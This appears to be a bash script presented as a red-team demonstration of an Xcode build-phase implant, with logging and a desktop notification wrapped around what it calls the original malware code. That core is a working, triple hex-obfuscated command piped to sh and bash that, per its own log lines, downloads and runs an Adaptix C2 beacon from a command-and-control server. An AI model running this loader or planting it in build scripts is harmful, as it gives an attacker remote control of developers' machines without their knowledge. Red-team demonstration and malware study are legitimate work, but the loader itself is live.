#!/usr/bin/env bash
# RED TEAM DEMO - Build Phase Implant (Verbose Mode)
# Matches original malware obfuscation with added visibility

# Demo logging (would not exist in real malware)
mkdir -p /tmp/redteam_demo
echo "[DEMO] ========================================" >> /tmp/redteam_demo/build.log
echo "[DEMO] Xcode Build Script Triggered" >> /tmp/redteam_demo/build.log
echo "[DEMO] Time: $(date)" >> /tmp/redteam_demo/build.log
echo "[DEMO] User: $(whoami)" >> /tmp/redteam_demo/build.log
echo "[DEMO] Project: $PROJECT_DIR" >> /tmp/redteam_demo/build.log
echo "[DEMO] C2 Server: http://192.168.36.226:9999" >> /tmp/redteam_demo/build.log
echo "[DEMO] Downloading Adaptix beacon..." >> /tmp/redteam_demo/build.log

# === ORIGINAL MALWARE CODE (exact format) ===
x=$(echo '33363333333733353337333233363633333233303332363433363336333733333336363233343633333233303336333833373334333733343337333033333631333236363332363633333331333333393333333233323635333333313333333633333338333236353333333333333336333236353333333233333332333333363333363133333339333333393333333933333339333236363336333133363337333633353336363533373334333236353336333233363339333636353332333033323634333636363332333033323636333733343336363433373330333236363332363533363331333233303332333633323336333233303336333333363338333636343336363633363334333233303332363233373338333233303332363633373334333636343337333033323636333236353336333133323330333233363332333633323330333236363337333433363634333733303332363633323635333633313332333033323336' | xxd -p -r | xxd -p -r | xxd -p -r | sh )
bash -c "$x" 
# === END ORIGINAL CODE ===

# Demo notification (would not exist in real malware)
osascript -e 'display notification "Adaptix beacon deployed!" with title "RED TEAM DEMO"' 2>/dev/null
echo "[DEMO] Adaptix beacon execution started" >> /tmp/redteam_demo/build.log
